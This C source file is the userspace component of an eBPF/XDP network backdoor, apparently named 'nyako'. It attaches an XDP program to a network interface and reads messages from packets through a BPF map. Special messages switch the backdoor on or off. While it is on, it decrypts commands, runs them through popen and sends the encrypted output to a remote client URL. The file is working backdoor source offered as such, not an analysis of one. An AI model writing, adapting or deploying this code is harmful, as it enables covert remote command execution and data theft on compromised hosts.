#include "nyako.h"

static bool active = false;

static int get_map_value(int fd, __u32 key, struct message_details *value)
{
  if ((bpf_map_lookup_elem(fd, &key, value)) != 0)
  {
    return -1;
  }

  return 0;
}

static int find_map_fd(const struct bpf_object *bpf_obj, const char *map_name)
{
  struct bpf_map *map;
  int map_fd = -1;

  map = bpf_object__find_map_by_name(bpf_obj, map_name);
  if (!map)
  {
    return map_fd;
  }

  map_fd = bpf_map__fd(map);
  return map_fd;
}

static void handle_message(struct message_details *message_details)
{
  FILE *cmd;
  unsigned char command[BUF_SIZE];
  char cmd_output[BUF_SIZE / 2];
  struct message message;
  int ciphertext_len;
  unsigned char nonce[crypto_secretbox_NONCEBYTES], nonce_hex[crypto_secretbox_NONCEBYTES * 2];
  unsigned char ciphertext_hex[BUF_SIZE * 2], ciphertext[BUF_SIZE];
  unsigned char res_message[MESSAGE_BUF_SIZE];

  // reset buffers
  memset(cmd_output, 0, sizeof(cmd_output));

  // skip if no data
  if (strlen((const char *)message_details->message) == 0)
  {
    // printf("empty message, skipping...\n");
    return;
  }

  parse_message(message_details->message, &message);

  // do not handle message if the backdoor is not active
  if (active != true && message.type != TYPE_INVOKE_BACKDOOR)
  {
    return;
  }

  if (message.type == TYPE_EXECUTE_CMD)
  {
    if (decrypt(command, message.ciphertext, message.ciphertext_len, message.nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH) < 0)
    {
      log_error("decrypt");
      return;
    }

    // execute the command
    cmd = popen((char *)command, "r");
    if (cmd == NULL)
    {
      log_error("popen");
      return;
    }

    // collect command result and send the result
    while (fread(cmd_output, sizeof(cmd_output) - 1, 1, cmd) >= 0)
    {
      if (ferror(cmd) != 0)
      {
        log_error("fread");
        break;
      }

      randombytes_buf(nonce, sizeof(nonce));

      cmd_output[sizeof(cmd_output) - 1] = '\0';
      if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)cmd_output, sizeof(cmd_output), nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
      {
        log_error("encrypt");
        break;
      }

      to_hex(ciphertext, ciphertext_len, ciphertext_hex);
      to_hex(nonce, sizeof(nonce), nonce_hex);
      if (craft_message(res_message, AUTH_HEADER, 0, TYPE_SEND_CMD_RESULT, ciphertext_len, ciphertext_hex, nonce_hex) < 0)
      {
        log_error("craft_message");
        break;
      }

      // TODO: fix to use dynamic IP
      send_request((unsigned char *)res_message, CLIENT_URL);
      
      bzero(cmd_output, sizeof(cmd_output));
      // break when the last segment is read
      if (feof(cmd) != 0)
        break;
    }

    pclose(cmd);
  }
  else if (message.type == TYPE_INVOKE_BACKDOOR)
  {
    active = true;
    log_info("backdoor invoked");
  }
  else if (message.type == TYPE_SUSPEND_BACKDOOR)
  {
    active = false;
    log_info("backdoor suspended");
  }
  else
  {
    log_error("unsupported command");
    return;
  }

  return;
}

static void message_poll(int map_fd, int interval)
{
  struct message_details message_details = { 0 };
  struct message_details empty_message_details = { 0 };

  while (true)
  {
    for (int i = 0; i < MESSAGE_QUEQUE_SIZE; i++)
    {
      if (get_map_value(map_fd, i, &message_details) < 0)
      {
        fprintf(stderr, "ERROR: bpf_map_lookup_elem failed key:0x%X\n", i);
        continue;
      }

      handle_message(&message_details);

      if (bpf_map_update_elem(map_fd, &i, &empty_message_details, BPF_EXIST) != 0)
      {
        fprintf(stderr, "ERROR: bpf_map_update_elem failed key:0x%X\n", i);
        continue;
      }
    }

    sleep(interval);
  }
}

int main()
{
  struct bpf_object *bpf_obj;
  int message_queque_map_fd;
  int interval = 10;

  struct config cfg = {
    .xdp_flags = XDP_FLAGS_UPDATE_IF_NOEXIST | XDP_FLAGS_SKB_MODE,
    .ifindex = IFINDEX,
  };

  strncpy(cfg.filename, NYAKO_KERN_FILENAME, sizeof(cfg.filename));
  strncpy(cfg.progsec, NYAKO_KERN_PROGSEC, sizeof(cfg.progsec));

  if (!(bpf_obj = load_bpf_and_xdp_attach(&cfg)))
  {
    log_error("load_bpf_and_xdp_attach");
    return -1;
  }

  message_queque_map_fd = find_map_fd(bpf_obj, MESSAGE_QUEQUE_MAP_NAME);
  if (message_queque_map_fd < 0)
  {
    xdp_link_detach(cfg.ifindex, cfg.xdp_flags, 0);
    log_error("find_map_fd");
    return -1;
  }

  message_poll(message_queque_map_fd, interval);

  return 0;
}

